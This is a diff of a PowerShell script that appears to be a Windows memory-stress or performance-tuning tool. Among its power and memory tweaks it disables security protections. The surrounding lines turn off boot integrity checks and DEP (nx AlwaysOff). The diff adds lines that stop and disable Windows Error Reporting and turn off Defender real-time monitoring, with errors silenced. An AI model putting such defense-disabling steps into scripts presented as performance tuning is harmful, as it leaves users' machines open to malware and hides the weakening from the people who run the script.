@@ -78,7 +78,7 @@ $hProcess = (Get-Process -Id $PID).Handle
 [MemoryWarper]::NtSetInformationProcess($hProcess, 0x23, [ref]0x1, 4) | Out-Null
 
 # Set minimum working set to 90% of physical memory
-$physMem = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory * 0.9)
+$physMem = [convert]::ToInt64((Get-CimInstance Win32_PhysicalMemory).Capacity)
 [MemoryWarper]::SetProcessWorkingSetSizeEx($hProcess, [IntPtr]$physMem, [IntPtr]::Zero, [MemoryWarper]::QUOTA_LIMITS_HARDWS_MIN_ENABLE) | Out-Null
 #endregion
 
@@ -98,7 +98,11 @@ Invoke-Expression "bcdedit /set useplatformclock true"
 Invoke-Expression "bcdedit /set disabledynamictick yes"
 Invoke-Expression "bcdedit /set nointegritychecks on"
 Invoke-Expression "bcdedit /set nx AlwaysOff"
-Invoke-Expression "bcdedit /set testsigning on"
+# Invoke-Expression "bcdedit /set testsigning on"
+
+# Kill Windows Error Reporting
+Stop-Service "WerSvc" -Force
+Set-Service "WerSvc" -StartupType Disabled
 
 # Power settings
 powercfg /setactive e9a42b02-d5df-448d-aa00-03f14749eb61  # Ultimate Performance
@@ -109,6 +113,9 @@ Disable-MMAgent -MemoryCompression -Force
 
 # Disable prefetch
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force
+
+# Disable antivirus interface
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 #endregion
 
 #region Memory Stress Core
